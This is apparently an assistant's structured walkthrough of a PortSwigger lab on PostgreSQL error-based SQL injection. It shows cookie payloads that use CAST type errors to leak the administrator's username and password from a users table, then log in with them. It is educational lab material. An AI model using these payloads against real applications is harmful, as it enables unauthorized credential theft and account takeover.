Your notes describe the **PostgreSQL error-based SQL injection** lab. I would organize them like this so the purpose of each step is clear.

# Objective

The objective of this lab is to **identify and exploit an error-based SQL injection vulnerability in the `TrackingId` cookie**. You will use Burp Suite to manipulate the cookie, confirm that SQL is being executed by the backend, exploit database error messages to extract the administrator's credentials, and then use those credentials to log in.

---

# 1. Explore the Application

Open the shop and inspect the request cookies.

Example:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ
```

The `TrackingId` cookie is the **injection point**.

The application uses this value in a backend SQL query, which means modifying the cookie can influence how the database processes the query.

---

# 2. Find the Request in HTTP History

In **Burp Suite → Proxy → HTTP history**, locate the request:

```http
GET / HTTP/2
Host: lab-id.web-security-academy.net
Cookie: TrackingId=ogAZZfxtOKUELbuJ
```

Send the request to **Repeater**.

Repeater allows you to modify the cookie repeatedly and observe how the response changes.

---

# 3. Add a Single Quote

Change:

```http
TrackingId=ogAZZfxtOKUELbuJ
```

to:

```http
TrackingId=ogAZZfxtOKUELbuJ'
```

If the application responds differently or generates an error, the additional quote may have interfered with the SQL syntax.

This is an initial indication that the cookie may be incorporated into a SQL statement.

---

# 4. Comment Out the Remaining Query

Try:

```http
TrackingId=ogAZZfxtOKUELbuJ'--
```

The:

```sql
--
```

starts a SQL comment in PostgreSQL.

Anything after it on that SQL line is treated as a comment.

This helps prevent the application's original SQL from interfering with the injected expression.

---

# 5. Introduce a Generic `SELECT` Subquery

Try:

```sql
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

The important portion is:

```sql
CAST((SELECT 1) AS int)
```

The subquery:

```sql
SELECT 1
```

returns the value:

```text
1
```

and `CAST(... AS int)` explicitly converts it to an integer.

The purpose at this stage is to establish that a subquery can be inserted into the SQL expression.

---

# 6. Make the Condition Boolean

Modify it to:

```sql
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

Now the expression is effectively:

```sql
1 = 1
```

which is TRUE.

The important concept is:

```text
SELECT 1
      ↓
returns 1
      ↓
CAST(... AS int)
      ↓
1
      ↓
1 = 1
      ↓
TRUE
```

This gives you a predictable SQL condition that can later be used to extract information.

---

# 7. Retrieve the Username

Replace the `SELECT 1` subquery with:

```sql
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

Now the database attempts to:

```sql
SELECT username FROM users
```

and convert the returned value to an integer.

If the username is something like:

```text
administrator
```

PostgreSQL cannot convert:

```text
administrator
```

into an integer.

Consequently, the database error can reveal the value.

This is the key idea behind **error-based SQL injection**:

```text
Database value
      ↓
Invalid CAST
      ↓
Database error
      ↓
Error message reveals value
```

---

# 8. Deal With the Character Limit

If the complete `TrackingId` value becomes too long, shorten the original cookie value.

For example:

```http
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

The exact initial `TrackingId` value isn't important for the lab; reducing it gives the injected SQL more space within the application's input limit.

---

# 9. Understand the Multiple-Row Error

This query:

```sql
SELECT username FROM users
```

may return multiple rows.

For example:

```text
administrator
carlos
wiener
```

But this expression:

```sql
CAST((SELECT username FROM users) AS int)
```

expects the subquery to provide **one value**.

Therefore PostgreSQL can report that the subquery returned multiple rows.

Conceptually:

```text
SELECT username FROM users
          ↓
administrator
carlos
wiener
          ↓
       3 rows
          ↓
Scalar expression expects 1 value
          ↓
        ERROR
```

---

# 10. Return Only One Row

Use:

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

`LIMIT 1` restricts the subquery to a single row.

Conceptually:

```sql
SELECT username
FROM users
LIMIT 1
```

might return:

```text
administrator
```

Then PostgreSQL attempts:

```sql
CAST('administrator' AS int)
```

which fails.

The resulting error can reveal:

```text
administrator
```

This confirms that the username has been extracted through the database error.

---

# 11. Extract the Password

Now change the selected column:

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

The process is now:

```text
SELECT password
FROM users
LIMIT 1
        ↓
one password value
        ↓
CAST(password AS int)
        ↓
invalid conversion
        ↓
PostgreSQL error
        ↓
password appears in error message
```

The exact password is generated by the individual PortSwigger lab instance, so it will not necessarily match examples from other walkthroughs.

---

# 12. Log In

Once the error message reveals the credentials, go to **My account** and enter:

```text
Username: administrator
Password: [password revealed by the error]
```

Successful authentication completes the lab.

---

# Complete Attack Flow

```text
TrackingId cookie
       │
       ▼
Add '
       │
       ▼
Observe SQL-related error
       │
       ▼
Add -- comment
       │
       ▼
Test SELECT subquery
       │
       ▼
CAST(subquery AS int)
       │
       ▼
Extract username
       │
       ▼
LIMIT 1
       │
       ▼
Extract password
       │
       ▼
Invalid CAST
       │
       ▼
Database error reveals value
       │
       ▼
Log in as administrator
```

## Key Concept

The most important technique in this lab is **forcing a type-conversion error**:

```sql
CAST((SELECT password FROM users LIMIT 1) AS int)
```

The password is text, while `int` expects a number. PostgreSQL therefore generates an error containing information about the value it attempted to convert.

So unlike **blind SQL injection**, where you infer information from differences such as HTTP 200 vs. HTTP 500, this lab uses the **database's error message itself as the information channel**.
